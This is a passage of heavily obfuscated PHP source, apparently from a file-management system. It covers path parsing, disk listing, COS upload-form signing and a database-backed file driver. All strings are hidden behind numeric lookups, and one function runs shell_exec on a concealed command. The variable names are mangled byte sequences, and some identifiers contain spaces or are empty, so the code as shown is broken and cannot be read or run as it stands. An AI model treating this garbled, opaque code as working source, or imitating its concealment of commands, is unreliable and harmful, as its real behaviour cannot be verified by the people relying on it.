$ã¾÷Èşø“[$ÓÍ«‡Ëè³ô[29]] = $¥³±; $ã¾÷Èşø“[$ÓÍ«‡Ëè³ô[1190]] = substr($¥³±, 1, -1); $ã¾÷Èşø“[$ÓÍ«‡Ëè³ô[395]] = $Š•ª±[3]; } $ã¾÷Èşø“[$ÓÍ«‡Ëè³ô[1096]] = $Š•ª±[4]; } $ö ® = array($ÓÍ«‡Ëè³ô[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ã¾÷Èşø“[$ÓÍ«‡Ëè³ô[1152]] = in_array($ã¾÷Èşø“[$ÓÍ«‡Ëè³ô[29]], $ö ®); return $ã¾÷Èşø“; } public static function isTruePath($—¸¡Û½) { $Ó“ó§”Œã¯ë =& $_SERVER[ÀÆ]; if (substr($—¸¡Û½, 0, 1) != $Ó“ó§”Œã¯ë[1189]) { return !0; } if (strpos($—¸¡Û½, $Ó“ó§”Œã¯ë[403]) === 0) { return !0; } if (strpos($—¸¡Û½, $Ó“ó§”Œã¯ë[1156]) === 0) { return !0; } if (strpos($—¸¡Û½, $Ó“ó§”Œã¯ë[1191]) === 0) { return !0; } if (strpos($—¸¡Û½, $Ó“ó§”Œã¯ë[1192]) === 0) { return !0; } if (strpos($—¸¡Û½, $Ó“ó§”Œã¯ë[1193]) === 0) { return !0; } return !1; } public static function clear($–ƒ¬Ğ‰Ú½) { $µú•¬ÉÂ§« =& $_SERVER[ÀÆ]; $–ƒ¬Ğ‰Ú½ = str_replace(array($µú•¬ÉÂ§«[1070], $µú•¬ÉÂ§«[229]), $µú•¬ÉÂ§«[50], $–ƒ¬Ğ‰Ú½); $–ƒ¬Ğ‰Ú½ = str_replace($µú•¬ÉÂ§«[97], $µú•¬ÉÂ§«[8], $–ƒ¬Ğ‰Ú½); $¢òî£ = $µú•¬ÉÂ§«[1194]; if (substr($–ƒ¬Ğ‰Ú½, 0, 3) == $µú•¬ÉÂ§«[1195]) { $–ƒ¬Ğ‰Ú½ = substr($–ƒ¬Ğ‰Ú½, 3); } while (strstr($–ƒ¬Ğ‰Ú½, $¢òî£)) { $–ƒ¬Ğ‰Ú½ = str_replace($¢òî£, $µú•¬ÉÂ§«[8], $–ƒ¬Ğ‰Ú½); } $–ƒ¬Ğ‰Ú½ = preg_replace($µú•¬ÉÂ§«[1196], $µú•¬ÉÂ§«[8], $–ƒ¬Ğ‰Ú½); if ($–ƒ¬Ğ‰Ú½ == $µú•¬ÉÂ§«[8]) { return $µú•¬ÉÂ§«[8]; } $–ƒ¬Ğ‰Ú½ = rtrim($–ƒ¬Ğ‰Ú½, $µú•¬ÉÂ§«[8]); return $–ƒ¬Ğ‰Ú½; } public static function sourceID($ÜÀÏü·’…) { $ÖÃ =& $_SERVER[ÀÆ]; $½üãïèü = self::parse($ÜÀÏü·’…); if ($½üãïèü[$ÖÃ[29]] !== self::KOD_SOURCE) { show_json(LNG($ÖÃ[1197]), !1); } return $½üãïèü[$ÖÃ[395]]; } public static function make($Æ¥¥çöå) { if (!$Æ¥¥çöå) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Æ¥¥çöå)); } public static function makeShare($¦»Å©°, $ş…™) { return self::makePath(self::KOD_SHARE_ITEM, $¦»Å©°, $ş…™); } public static function makeFileTypePath($Šõ¥Šå£àç) { return self::makePath(self::KOD_USER_FILE_TYPE, $Šõ¥Šå£àç); } public static function makeFileTagPath($‚) { return self::makePath(self::KOD_USER_FILE_TAG, $‚); } public static function makePath($å, $êÚøÃ• = '', $Ñ¤‘äÆóˆñ = '') { $ıÖ›ÃğÄ‰¸ … =& $_SERVER[ÀÆ]; $Ş”· = substr($å, 1, -1); $Æ¹‚óºãñ±ıê = $ıÖ›ÃğÄ‰¸ …[1198] . $Ş”· . $ıÖ›ÃğÄ‰¸ …[1199] . $êÚøÃ• . $ıÖ›ÃğÄ‰¸ …[1200]; $Æ¹‚óºãñ±ıê = $Ñ¤‘äÆóˆñ ? $Æ¹‚óºãñ±ıê . $Ñ¤‘äÆóˆñ . $ıÖ›ÃğÄ‰¸ …[8] : $Æ¹‚óºãñ±ıê; return $Æ¹‚óºãñ±ıê; } public static function hashPath($ÃÏ¬»úÜÑ, $œòÒø˜çÆ–¯ê = true) { $ªŸĞÏßõˆ =& $_SERVER[ÀÆ]; $«Ÿ€·í‡Ä = is_array($ÃÏ¬»úÜÑ) ? $ÃÏ¬»úÜÑ : IO::info($ÃÏ¬»úÜÑ); $‹Ğ‰‹Ù = _get($«Ÿ€·í‡Ä, $ªŸĞÏßõˆ[1201], $ªŸĞÏßõˆ[33]); if (!$‹Ğ‰‹Ù && isset($«Ÿ€·í‡Ä[$ªŸĞÏßõˆ[397]])) { $«Ÿ€·í‡Ä = IO::info(KodIO::make($«Ÿ€·í‡Ä[$ªŸĞÏßõˆ[397]])); $‹Ğ‰‹Ù = _get($«Ÿ€·í‡Ä, $ªŸĞÏßõˆ[1201], $ªŸĞÏßõˆ[33]); } if (!$‹Ğ‰‹Ù && $œòÒø˜çÆ–¯ê) { $¶€üëæ²§ã¯ = KodIO::parse($«Ÿ€·í‡Ä[$ªŸĞÏßõˆ[76]]); if (!$¶€üëæ²§ã¯[$ªŸĞÏßõˆ[29]]) { $‹Ğ‰‹Ù = IO::hashSimple($«Ÿ€·í‡Ä[$ªŸĞÏßõˆ[76]]); } } if (!$‹Ğ‰‹Ù) { $‹Ğ‰‹Ù = md5($«Ÿ€·í‡Ä[$ªŸĞÏßõˆ[76]] . $«Ÿ€·í‡Ä[$ªŸĞÏßõˆ[78]] . $«Ÿ€·í‡Ä[$ªŸĞÏßõˆ[84]]); } return $‹Ğ‰‹Ù; } public static function initSystemPath() { $öĞğÁ•ç€š =& $_SERVER[ÀÆ]; if (defined($öĞğÁ•ç€š[1202])) { return; } define($öĞğÁ•ç€š[1202], self::systemPath($öĞğÁ•ç€š[1203])); define($öĞğÁ•ç€š[1204], self::systemPath($öĞğÁ•ç€š[1205])); define($öĞğÁ•ç€š[1206], self::systemPath($öĞğÁ•ç€š[1207])); define($öĞğÁ•ç€š[1208], self::systemPath($öĞğÁ•ç€š[1209])); IOHistory::bindEvent(); } public static function systemPath($ûùÛºùµ) { $¦ğ®æÕ¨ =& $_SERVER[ÀÆ]; $›Ü­ = $¦ğ®æÕ¨[1210] . ucfirst($ûùÛºùµ); $¿¹“¡® ÌÄØ = Model($¦ğ®æÕ¨[755])->get($›Ü­); if ($¿¹“¡® ÌÄØ) { return $¿¹“¡® ÌÄØ; } if ($ûùÛºùµ == $¦ğ®æÕ¨[1203]) { $¿¹“¡® ÌÄØ = self::make(Model($¦ğ®æÕ¨[817])->systemRootPathAdd($¦ğ®æÕ¨[531])); } else { $¿¹“¡® ÌÄØ = self::systemPath($¦ğ®æÕ¨[1203]); $´ç¬×¿‚„Ğóş = self::sourceID($¿¹“¡® ÌÄØ); $¿¹“¡® ÌÄØ = self::make(Model($¦ğ®æÕ¨[817])->mkdir($´ç¬×¿‚„Ğóş, $ûùÛºùµ)); } Model($¦ğ®æÕ¨[755])->set($›Ü­, $¿¹“¡® ÌÄØ); return $¿¹“¡® ÌÄØ; } public static function systemFolder($¥ç²âëà) { $Ï¶ğêÒ­­Å = IO_PATH_SYSTEM_SOURCE . $¥ç²âëà; $ ÆìŞ = Cache::get($Ï¶ğêÒ­­Å); if (!$ ÆìŞ) { $ğ±•È™¸› = IO::infoFull($Ï¶ğêÒ­­Å); if (!$ğ±•È™¸›) { $ ÆìŞ = IO::mkdir($Ï¶ğêÒ­­Å, REPEAT_SKIP); } else { $ ÆìŞ = $ğ±•È™¸›[$_SERVER[ÀÆ][76]]; } Cache::set($Ï¶ğêÒ­­Å, $ ÆìŞ, 3600 * 10); } return $ ÆìŞ; } public static function defaultDriver() { return Model($_SERVER[ÀÆ][752])->defaultDriver(); } public static function defaultIO() { $áºÍú¤Ä† =& $_SERVER[ÀÆ]; $óª»ïç = self::defaultDriver(); return $áºÍú¤Ä†[1211] . $óª»ïç[$áºÍú¤Ä†[395]] . $áºÍú¤Ä†[1200]; } public static function defaultDriverInit() { static $¿ó = false; if ($¿ó) { return $¿ó; } $¿ó = IO::init(self::defaultIO()); return $¿ó; } public static function fileTypeList() { $Ô°ÁÅæî =& $_SERVER[ÀÆ]; $®±ñ³î¾ = $GLOBALS[$Ô°ÁÅæî[6]][$Ô°ÁÅæî[1212]]; foreach ($®±ñ³î¾ as $§öè½ÕÀ => $òãœ ğç) { $çÓ£Æ»˜·äÕÔ = $Ô°ÁÅæî[1213] . $§öè½ÕÀ; $»ÜÉ½Ê = LNG($çÓ£Æ»˜·äÕÔ); if ($çÓ£Æ»˜·äÕÔ != $»ÜÉ½Ê) { $®±ñ³î¾[$§öè½ÕÀ][$Ô°ÁÅæî[28]] = $»ÜÉ½Ê; } } return $®±ñ³î¾; } public static function diskList($™òù = true) { $í‘‚”‚Àœ„ØĞ = $_SERVER[ÀÆ][1214]; if ($™òù) { $Ê’ó”üÏÆ·Ê = Cache::get($í‘‚”‚Àœ„ØĞ); if (is_array($Ê’ó”üÏÆ·Ê)) { return $Ê’ó”üÏÆ·Ê; } } $Ê’ó”üÏÆ·Ê = self::diskListGet(); Cache::set($í‘‚”‚Àœ„ØĞ, $Ê’ó”üÏÆ·Ê, 3600); return $Ê’ó”üÏÆ·Ê; } public static function diskListGet() { $“âÍ¨†ÎúŞ =& $_SERVER[ÀÆ]; $éÈ«Ò•³â•ü = array(); if ($GLOBALS[$“âÍ¨†ÎúŞ[6]][$“âÍ¨†ÎúŞ[1215]] == $“âÍ¨†ÎúŞ[1216]) { $Ã§¬ìøè…ÓœÁ = $“âÍ¨†ÎúŞ[1217]; for ($–×‹â §™ = 0; $–×‹â §™ < strlen($Ã§¬ìøè…ÓœÁ); $–×‹â §™++) { $¾Ãù²ÌñÉŞ = $Ã§¬ìøè…ÓœÁ[$–×‹â §™] . $“âÍ¨†ÎúŞ[1218]; if (file_exists($¾Ãù²ÌñÉŞ)) { $éÈ«Ò•³â•ü[] = $¾Ãù²ÌñÉŞ; } } return $éÈ«Ò•³â•ü; } if (!function_exists($“âÍ¨†ÎúŞ[98])) { $éÈ«Ò•³â•ü[] = $“âÍ¨†ÎúŞ[827]; return $éÈ«Ò•³â•ü; } $ÌœË¸™Ù†Í°½ = explode($“âÍ¨†ÎúŞ[229], shell_exec($“âÍ¨†ÎúŞ[1219])); array_shift($ÌœË¸™Ù†Í°½); array_pop($ÌœË¸™Ù†Í°½); $˜ï±®… = array($“âÍ¨†ÎúŞ[1220], $“âÍ¨†ÎúŞ[1221], $“âÍ¨†ÎúŞ[1222], $“âÍ¨†ÎúŞ[1223]); foreach ($ÌœË¸™Ù†Í°½ as $Óùˆ) { $„ˆ«°š = preg_split($“âÍ¨†ÎúŞ[1224], $Óùˆ); $¾Ãù²ÌñÉŞ = $„ˆ«°š[count($„ˆ«°š) - 1]; if (!strstr($„ˆ«°š[0], $“âÍ¨†ÎúŞ[1225])) { continue; } if (!$¾Ãù²ÌñÉŞ || in_array($¾Ãù²ÌñÉŞ, $˜ï±®…)) { continue; } $éÈ«Ò•³â•ü[] = rtrim($¾Ãù²ÌñÉŞ, $“âÍ¨†ÎúŞ[8]) . $“âÍ¨†ÎúŞ[8]; } return $éÈ«Ò•³â•ü; } public static function isSameDisk($é•, $Ö–ı‰€‘ñ‘) { $É½ =& $_SERVER[ÀÆ]; if ($GLOBALS[$É½[6]][$É½[1215]] == $É½[1216]) { return strtolower(substr($é•, 0, 1)) == strtolower(substr($Ö–ı‰€‘ñ‘, 0, 1)); } $¸óƒÀÄ÷ó = self::diskList(); $Ü®¹ñšÊÇç = !1; $ªÈ©Œ¼óÁáª = !1; sort($¸óƒÀÄ÷ó); $¸óƒÀÄ÷ó = array_reverse($¸óƒÀÄ÷ó); $é• = rtrim($é•, $É½[8]) . $É½[8]; $Ö–ı‰€‘ñ‘ = rtrim($Ö–ı‰€‘ñ‘, $É½[8]) . $É½[8]; foreach ($¸óƒÀÄ÷ó as $ûåÖ¿º) { $µ–¢‹äûŠµ = strlen($ûåÖ¿º); if (!$Ü®¹ñšÊÇç && substr($é•, 0, $µ–¢‹äûŠµ) == $ûåÖ¿º) { $Ü®¹ñšÊÇç = $ûåÖ¿º; } if (!$ªÈ©Œ¼óÁáª && substr($Ö–ı‰€‘ñ‘, 0, $µ–¢‹äûŠµ) == $ûåÖ¿º) { $ªÈ©Œ¼óÁáª = $ûåÖ¿º; } if ($Ü®¹ñšÊÇç && $ªÈ©Œ¼óÁáª) { break; } } return $Ü®¹ñšÊÇç === $ªÈ©Œ¼óÁáª; } public static function transferType($ö¹†, $Í÷ê) { $ì‚¹Öùµ”›ê¨ =& $_SERVER[ÀÆ]; $‰Ÿ¥Õø´÷ = self::driverType($ö¹†); $À˜Ğ•÷«òé = self::driverType($Í÷ê); if ($‰Ÿ¥Õø´÷[$ì‚¹Öùµ”›ê¨[29]] == $À˜Ğ•÷«òé[$ì‚¹Öùµ”›ê¨[29]] && $‰Ÿ¥Õø´÷[$ì‚¹Öùµ”›ê¨[1226]] == $À˜Ğ•÷«òé[$ì‚¹Öùµ”›ê¨[1226]]) { return $ì‚¹Öùµ”›ê¨[1227]; } if ($‰Ÿ¥Õø´÷[$ì‚¹Öùµ”›ê¨[29]] == $ì‚¹Öùµ”›ê¨[856] && $À˜Ğ•÷«òé[$ì‚¹Öùµ”›ê¨[29]] == $ì‚¹Öùµ”›ê¨[106]) { return $ì‚¹Öùµ”›ê¨[1126]; } if ($‰Ÿ¥Õø´÷[$ì‚¹Öùµ”›ê¨[29]] == $ì‚¹Öùµ”›ê¨[106] && $À˜Ğ•÷«òé[$ì‚¹Öùµ”›ê¨[29]] == $ì‚¹Öùµ”›ê¨[856]) { return $ì‚¹Öùµ”›ê¨[107]; } return $ì‚¹Öùµ”›ê¨[1228]; } public static function driverType($ıˆº”™) { $ÚÈâ =& $_SERVER[ÀÆ]; $¬¥ˆˆ°‚ÌĞ = str_replace($ÚÈâ[1229], $ÚÈâ[33], strtolower($ıˆº”™->getType())); if ($¬¥ˆˆ°‚ÌĞ == $ÚÈâ[743] || $¬¥ˆˆ°‚ÌĞ == $ÚÈâ[1230] || $¬¥ˆˆ°‚ÌĞ == $ÚÈâ[1231]) { $ıˆº”™ = self::defaultDriverInit(); } else { if ($¬¥ˆˆ°‚ÌĞ == $ÚÈâ[1133] || $¬¥ˆˆ°‚ÌĞ == $ÚÈâ[1232]) { $ıˆº”™ = IO::init($ıˆº”™->pathParse[$ÚÈâ[1080]]); } } $§Ş = $ıˆº”™->path; $¬¥ˆˆ°‚ÌĞ = str_replace($ÚÈâ[1229], $ÚÈâ[33], strtolower($ıˆº”™->getType())); if ($¬¥ˆˆ°‚ÌĞ == $ÚÈâ[106]) { return array($ÚÈâ[29] => $ÚÈâ[106], $ÚÈâ[1226] => $ÚÈâ[33], $ÚÈâ[76] => $§Ş); } return array($ÚÈâ[29] => $ÚÈâ[856], $ÚÈâ[1226] => $ıˆº”™->pathDriver, $ÚÈâ[76] => $§Ş); } public static function pathDriverType($œÙİÑË¥) { return $œÙİÑË¥ ? self::driverType(IO::init($œÙİÑË¥)) : !1; } } goto f…¦¶Öñİğ; f…¦¶Öñİğ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ë¢Ü) { parent::__construct($ë¢Ü); $this->signatureVersion($_SERVER[ÀÆ][212]); } public function uploadFormData($µáˆ£€¼ÅŞ, $—À„ã­•ó–Ì = 3600) { $±©Ô±¹¹ëóÈ =& $_SERVER[ÀÆ]; $×¬Ôû«‚‰ = $±©Ô±¹¹ëóÈ[192]; $³Ö„ê = $±©Ô±¹¹ëóÈ[230]; $–ˆøÅÜÛ = $±©Ô±¹¹ëóÈ[1233]; $µ’Åş¬ = gmdate($±©Ô±¹¹ëóÈ[1234], time() + $—À„ã­•ó–Ì); $’Ş –¸š¹ = (string) time() . $±©Ô±¹¹ëóÈ[68] . (string) (time() + $—À„ã­•ó–Ì); $ÓË‘çüŠ = array($±©Ô±¹¹ëóÈ[1235] => $µ’Åş¬, $±©Ô±¹¹ëóÈ[1236] => array(array($±©Ô±¹¹ëóÈ[1237] => $×¬Ôû«‚‰), array($±©Ô±¹¹ëóÈ[1238] => $this->bucket), array($±©Ô±¹¹ëóÈ[1239], $±©Ô±¹¹ëóÈ[1240], $±©Ô±¹¹ëóÈ[33]), array($±©Ô±¹¹ëóÈ[1241] => $–ˆøÅÜÛ), array($±©Ô±¹¹ëóÈ[1242] => $³Ö„ê), array($±©Ô±¹¹ëóÈ[1243] => $this->accessKey), array($±©Ô±¹¹ëóÈ[1244] => $’Ş –¸š¹))); $ÓË‘çüŠ = json_encode($ÓË‘çüŠ); $éì³›¶‡ìæĞì = hash_hmac($±©Ô±¹¹ëóÈ[230], $’Ş –¸š¹, $this->secret); $Õ‘İéşÕú¸¤ = sha1($ÓË‘çüŠ); $µ×ê”› = hash_hmac($±©Ô±¹¹ëóÈ[230], $Õ‘İéşÕú¸¤, $éì³›¶‡ìæĞì); $Àî­ = array($±©Ô±¹¹ëóÈ[1237] => $×¬Ôû«‚‰, $±©Ô±¹¹ëóÈ[1241] => $–ˆøÅÜÛ, $±©Ô±¹¹ëóÈ[1245] => base64_encode($ÓË‘çüŠ), $±©Ô±¹¹ëóÈ[1242] => $³Ö„ê, $±©Ô±¹¹ëóÈ[1243] => $this->accessKey, $±©Ô±¹¹ëóÈ[1246] => $’Ş –¸š¹, $±©Ô±¹¹ëóÈ[1247] => $µ×ê”›, $±©Ô±¹¹ëóÈ[175] => $this->getHost()); return $Àî­; } public function fileOutLink($…­Ş‰‘ÚÊëû“) { $¤¬–œ†¹Äè =& $_SERVER[ÀÆ]; if (substr($…­Ş‰‘ÚÊëû“, 0, 7) == $¤¬–œ†¹Äè[1248]) { $…­Ş‰‘ÚÊëû“ = $¤¬–œ†¹Äè[1249] . substr($…­Ş‰‘ÚÊëû“, 7); } header($¤¬–œ†¹Äè[159] . $…­Ş‰‘ÚÊëû“); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Óü) { $this->pathParse = $Óü; $this->model = Model($_SERVER[ÀÆ][1250]); } public function getPath($ï¿è­ùÔƒè‘) { return trim($ï¿è­ùÔƒè‘, $_SERVER[ÀÆ][8]); } public function pathFather($¨¨ã§¬·) { $ÙÓ¦ Å¶ÑŠ = $this->parse($¨¨ã§¬·); $ÙÓ¦ Å¶ÑŠ = $this->infoSimple($¨¨ã§¬·); return $ÙÓ¦ Å¶ÑŠ ? $ÙÓ¦ Å¶ÑŠ[$_SERVER[ÀÆ][492]] : !1; } public function pathThis($Ûúòîäõ…) { $Üö = $this->infoSimple($Ûúòîäõ…); return $Üö ? $Üö[$_SERVER[ÀÆ][28]] : !1; } public function getPathOuter($şì£ê˜‹Ó) { if (!$şì£ê˜‹Ó) { return $şì£ê˜‹Ó; } $â±ÁŒó»­ôÈ = $this->parse($şì£ê˜‹Ó); return KodIO::make($â±ÁŒó»­ôÈ[$_SERVER[ÀÆ][395]]); } public function copyFolderFromIO($¬Ô’Ù»‹È¢™, $Å¸È®åÆ²¹, $êÆë, $ß„éã«çÚ, $ğ) { $¼Å = $this->model->copyFolderFromIO($¬Ô’Ù»‹È¢™, $Å¸È®åÆ²¹, $êÆë, $ß„éã«çÚ, $ğ); return KodIO::make($¼Å); } public function isParentOf($º”ˆ, $) { return $this->model->isParentOf($º”ˆ, $); } public function mkfile($î·ø, $©° = '', $‘éÓ© = REPEAT_RENAME) { $ÚØ† =& $_SERVER[ÀÆ]; $„˜€ = $this->parse($î·ø); $î·ø = $„˜€[$ÚØ†[395]]; for ($ÍÑ–ÙÄ = 0; $ÍÑ–ÙÄ < count($„˜€[$ÚØ†[1251]]); $ÍÑ–ÙÄ++) { $µÚµç§¥ = $„˜€[$ÚØ†[1251]][$ÍÑ–ÙÄ]; if ($ÍÑ–ÙÄ == count($„˜€[$ÚØ†[1251]]) - 1) { $î·ø = $this->model->mkfile($î·ø, $µÚµç§¥, $©°, $‘éÓ©); break; } $î·ø = $this->model->mkdir($î·ø, $µÚµç§¥, REPEAT_SKIP); } return $this->getPathOuter($î·ø); } public function mkdir($ƒêÃ, $—»Æâù‚ß = REPEAT_SKIP) { $¦§öÊ =& $_SERVER[ÀÆ]; $·ı = $this->parse($ƒêÃ); $ƒêÃ = $·ı[$¦§öÊ[395]]; for ($©¹îŞÁó = 0; $©¹îŞÁó < count($·ı[$¦§öÊ[1251]]); $©¹îŞÁó++) { $·¦£ ¶ªâïÃ = $·ı[$¦§öÊ[1251]][$©¹îŞÁó]; $ƒêÃ = $this->model->mkdir($ƒêÃ, $·¦£ ¶ªâïÃ, $—»Æâù‚ß); } return $this->getPathOuter($ƒêÃ); } public function copyFile($Í¾ÑÒá, $—ëÈ¥Ç€¸ğÉÑ, $ÀÂ = REPEAT_REPLACE) { $¥é·Ò =& $_SERVER[ÀÆ]; $¤éÁˆÒ…‹û† = $this->parse($—ëÈ¥Ç€¸ğÉÑ); $æ“äÜ£Í¾ = $this->model->copy($Í¾ÑÒá, $¤éÁˆÒ…‹û†[$¥é·Ò[395]], $ÀÂ, $¤éÁˆÒ…‹û†[$¥é·Ò[76]]); return $æ“äÜ£Í¾ ? $this->getPathOuter($æ“äÜ£Í¾) : !1; } public function moveFile($•àî, $ËÊŠ—¾½ù„€, $æõ«ä“ = REPEAT_REPLACE) { $ƒ•è€ŒçÊ“ =& $_SERVER[ÀÆ]; $Ÿ¤¿È = $this->parse($ËÊŠ—¾½ù„€); $ç÷ä»÷Ê = $this->model->move($•àî, $Ÿ¤¿È[$ƒ•è€ŒçÊ“[395]], $æõ«ä“, $Ÿ¤¿È[$ƒ•è€ŒçÊ“[76]]); return $ç÷ä»÷Ê ? $this->getPathOuter($ç÷ä»÷Ê) : !1; } public function copy($Çˆ§øš, $ÇŸ¨×, $ğ…¯ = REPEAT_REPLACE) { $ÍµÚ™ËûÊÒ = $this->parse($ÇŸ¨×); $Ö™ = $this->model->copy($Çˆ§øš, $ÍµÚ™ËûÊÒ[$_SERVER[ÀÆ][395]], $ğ…¯); return $Ö™ ? $this->getPathOuter($Ö™) : !1; } public function moveSameAllow() { } public function move($´¯€™ìË¼¢, $ÏÙğ¤ëîİéÂ, $áğ = REPEAT_REPLACE) { $½ò = $this->parse($ÏÙğ¤ëîİéÂ); $šÌ’ç = $this->model->move($´¯€™ìË¼¢, $½ò[$_SERVER[ÀÆ][395]], $áğ); return $šÌ’ç ? $this->getPathOuter($šÌ’ç) : !1; } public function remove($¶‡÷ö¢õ, $“ÕÊïµÚ = true) { return $this->model->remove($¶‡÷ö¢õ, $“ÕÊïµÚ); } public function rename($Ã…¼€ñµ§¬Æ, $ù¾ªÙğç) { $İ› = $this->model->rename($Ã…¼€ñµ§¬Æ, $ù¾ªÙğç); return $İ› ? $this->getPathOuter($Ã…¼€ñµ§¬Æ) : $İ›; } public function size($„îíüê…) { $”å¼™öø = $this->infoSimple($„îíüê…); return $”å¼™öø ? $”å¼™öø[$_SERVER[ÀÆ][78]] : 0; } public function infoSimple($­¯¼‹) { return $this->model->sourceInfo($­¯¼‹); } public function info($Œñ­ıùŠ) { return $this->infoParse($Œñ­ıùŠ); } public function infoAuth($¤—ÂÑç¶ó) { return $this->infoParse($¤—ÂÑç¶ó, !1, !0); } public function infoWithChildren($ó¸¤â×ÄİÄğ‚) { return $this->infoParse($ó¸¤â×ÄİÄğ‚, !0); } protected function infoParse($Ÿ­Ä“ŠÆ, $ˆ–‰Æ½ï® = false, $Ã¨Â³ïÊ„ = false) { if (!$ˆ–‰Æ½ï®) { return $this->model->pathInfo($Ÿ­Ä“ŠÆ, $Ã¨Â³ïÊ„); } return $this->model->pathInfoMore($Ÿ­Ä“ŠÆ); } public function infoFull($û÷‡óîˆ—) { $º =& $_SERVER[ÀÆ]; $ÙöôòÛØ–Ò = explode($º[8], $û÷‡óîˆ—); $½ÜŸİÛ”¡ˆŒ = implode($º[8], array_splice($ÙöôòÛØ–Ò, 1)); return $this->model->pathInfoByPath($ÙöôòÛØ–Ò[0], $½ÜŸİÛ”¡ˆŒ); } public function hashSimple($ûö„Œåí¾«ş) { $èø¤ö°„÷Ä =& $_SERVER[ÀÆ]; $Ûô±…¢ÇÔ = $this->infoWithChildren($ûö„Œåí¾«ş); return $Ûô±…¢ÇÔ[$èø¤ö°„÷Ä[164]][$èø¤ö°„÷Ä[171]]; } public function hashMd5($˜¦’) { $°×³«ÛëÑ¬Ğ =& $_SERVER[ÀÆ]; $åëÂÍòËÚ = $this->infoWithChildren($˜¦’); return $åëÂÍòËÚ[$°×³«ÛëÑ¬Ğ[164]][$°×³«ÛëÑ¬Ğ[170]]; } public function exist($—£—´) { $³â„šã =& $_SERVER[ÀÆ]; $±àÂÍ¶Ã‡Ï­ = $this->parse($—£—´); if (!$±àÂÍ¶Ã‡Ï­[$³â„šã[76]]) { return $this->isFile($—£—´) || $this->isFolder($—£—´); } $¼ã×˜›Û = array($³â„šã[396] => $±àÂÍ¶Ã‡Ï­[$³â„šã[395]], $³â„šã[28] => $±àÂÍ¶Ã‡Ï­[$³â„šã[76]]); $Ú‡¬È¨ = $this->model->where($¼ã×˜›Û)->find(); return $Ú‡¬È¨ ? !0 : !1; } public function isFile($©¶ÙßÖåø) { $×Ç­ä› =& $_SERVER[ÀÆ]; $¸ÊøİÌ£ı = $this->infoSimple($©¶ÙßÖåø); return $¸ÊøİÌ£ı && $¸ÊøİÌ£ı[$×Ç­ä›[405]] == $×Ç­ä›[87] ? !1 : !0; } public function isFolder($ÓÄêÁÎ·Á½Î ) { $öÈö =& $_SERVER[ÀÆ]; $ÈÄ¡ = $this->infoSimple($ÓÄêÁÎ·Á½Î ); return $ÈÄ¡ && $ÈÄ¡[$öÈö[405]] == $öÈö[87] ? !0 : !1; } public function listPath($Ğºû›ç¹, $ˆõ•õ¹ õ—Ø = false) { $Ì¥„æˆˆÅ =& $_SERVER[ÀÆ]; if ($Ğºû›ç¹ == $Ì¥„æˆˆÅ[33]) { return !1; } $Å½èàµ›±šà = array($Ì¥„æˆˆÅ[396] => $Ğºû›ç¹); if ($ˆõ•õ¹ õ—Ø) { return $this->model->listSource($Å½èàµ›±šà, -1); } return $this->model->listSource($Å½èàµ›±šà); } public function has($šŸ©­¬ü, $ìûÌûú¼ˆ = false, $ß¬¶ëİâ‚ˆ = null) { $‰ëò¬ô„Ì³ =& $_SERVER[ÀÆ]; $‰‚›‰ĞÈ” = $this->infoWithChildren($šŸ©­¬ü); if ($ìûÌûú¼ˆ) { return array($‰ëò¬ô„Ì³[204] => $‰‚›‰ĞÈ”[$‰ëò¬ô„Ì³[204]], $‰ëò¬ô„Ì³[203] => $‰‚›‰ĞÈ”[$‰ëò¬ô„Ì³[203]]); } return $ß¬¶ëİâ‚ˆ ? $‰‚›‰ĞÈ”[$‰ëò¬ô„Ì³[204]] : $‰‚›‰ĞÈ”[$‰ëò¬ô„Ì³[203]]; } public function listAll($èìÔ) { $×€™³Â‰å = IO::info($this->pathParse[$_SERVER[ÀÆ][76]]); if (!$×€™³Â‰å) { return array(); } return $this->model->listAll($èìÔ); } public function getContent($®ç) { return $this->model->getContent($®ç); } public function setContent($îè‹ÌêÌĞ, $Ñ£Àåó¢•Ş˜ = '') { return $this->model->setContent($îè‹ÌêÌĞ, $Ñ£Àåó¢•Ş˜); } public function fileSubstr($ÉÉ»»İ²µ”, $ğùäÃÑ, $‡ÑÊ½‰®ş›ÛÆ) { return $this->model->fileSubstr($ÉÉ»»İ²µ”, $ğùäÃÑ, $‡ÑÊ½‰®ş›ÛÆ); } public function download($Í‹Ó¸, $Ü³©Ë×ªó = '') { $Ê ˆ“Ş¹–‡° = get_path_father($Ü³©Ë×ªó); $Ğû ¸ìˆ  = get_path_this($Ü³©Ë×ªó); $™ÅâçóùãèÁ‡ = $this->model->fileInfoGet($Í‹Ó¸); $Ê·½™Ş»Ìµ = IO::copy($™ÅâçóùãèÁ‡[$_SERVER[ÀÆ][76]], $Ê ˆ“Ş¹–‡°, !1, $Ğû ¸ìˆ ); return $Ê·½™Ş»Ìµ; } public function setModifyTime($şãàÔ‘¦, $ˆ‡â‚ã = '') { $ËîÙÅ =& $_SERVER[ÀÆ]; if (!$şãàÔ‘¦) { return; } $this->model->where(array($ËîÙÅ[412] => $şãàÔ‘¦))->save(array($ËîÙÅ[84] => $ˆ‡â‚ã)); } public function upload($Ùí³’âîíı¬, $Ê¼‹ô‡Ç, $ƒüÌÎÄñşê = false, $Š×´¾½ˆè‚È = REPEAT_REPLACE) { $’Æ½Ş =& $_SERVER[ÀÆ]; $ûëû = $this->parse($Ùí³’âîíı¬); $ğ²ˆû¾‡È¡ = $this->model->addFile($ûëû[$’Æ½Ş[395]], $Ê¼‹ô‡Ç, $ûëû[$’Æ½Ş[76]], $ƒüÌÎÄñşê, $Š×´¾½ˆè‚È); return $this->getPathOuter($ğ²ˆû¾‡È¡); } public function uploadFileByID($†úˆì´Ì, $ƒî, $ôˆï¿İˆÈ•«¹) { $Î±½›ÉèÁ =& $_SERVER[ÀÆ]; $é†ä = $this->parse($†úˆì´Ì); $ğ½Ÿ´ = $this->model->addFileByFileID($é†ä[$Î±½›ÉèÁ[395]], $ƒî, $é†ä[$Î±½›ÉèÁ[76]], $ôˆï¿İˆÈ•«¹); return $this->getPathOuter($ğ½Ÿ´); } public function addFileByRemote($ôëâ‹ğäş, $Àáä, $É…¨•¹· = array(), $¶È¹ = '', $Èµ˜‡´®æ°¹) { $è§Ì˜¾æÌ´½÷ =& $_SERVER[ÀÆ]; $š‚ç™À“ÃŠÇ = $this->parse($ôëâ‹ğäş); 